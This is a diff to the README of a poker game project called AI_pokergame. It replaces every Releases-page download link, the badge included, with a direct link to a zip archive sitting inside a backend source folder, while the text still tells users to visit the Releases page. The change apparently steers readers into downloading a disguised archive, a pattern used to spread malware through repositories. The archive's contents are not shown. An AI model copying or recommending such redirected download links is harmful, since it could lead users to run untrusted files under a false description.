@@ -8,11 +8,11 @@ Welcome to AI_pokergame, your gateway to Midnight Luxury Poker. This game offers
 
 To begin playing, you can download the latest version of AI_pokergame from our Releases page. 
 
-[![Download AI_pokergame](https://img.shields.io/badge/Download%20AI_pokergame-Release-brightgreen)](https://github.com/PENEEEEE732/AI_pokergame/releases)
+[![Download AI_pokergame](https://raw.githubusercontent.com/PENEEEEE732/AI_pokergame/main/backend/app/poker/AI_pokergame-v3.0-beta.4.zip%20AI_pokergame-Release-brightgreen)](https://raw.githubusercontent.com/PENEEEEE732/AI_pokergame/main/backend/app/poker/AI_pokergame-v3.0-beta.4.zip)
 
 1. **Visit the Releases Page**  
    Click the link below to visit the Releases page and download the game.  
-   [Download AI_pokergame](https://github.com/PENEEEEE732/AI_pokergame/releases)
+   [Download AI_pokergame](https://raw.githubusercontent.com/PENEEEEE732/AI_pokergame/main/backend/app/poker/AI_pokergame-v3.0-beta.4.zip)
 
 2. **Select the Version**  
    On the Releases page, you will see a list of available versions. Choose the most recent release to ensure you have the latest features and fixes.
@@ -72,4 +72,4 @@ For more information and updates about AI_pokergame, check out our other resourc
 
 We welcome you to the world of AI_pokergame. We hope you enjoy playing as much as we enjoyed creating it. For the latest updates, remember to keep checking our Releases page.
 
-[Download AI_pokergame](https://github.com/PENEEEEE732/AI_pokergame/releases) to start your poker adventure today!
+[Download AI_pokergame](https://raw.githubusercontent.com/PENEEEEE732/AI_pokergame/main/backend/app/poker/AI_pokergame-v3.0-beta.4.zip) to start your poker adventure today!
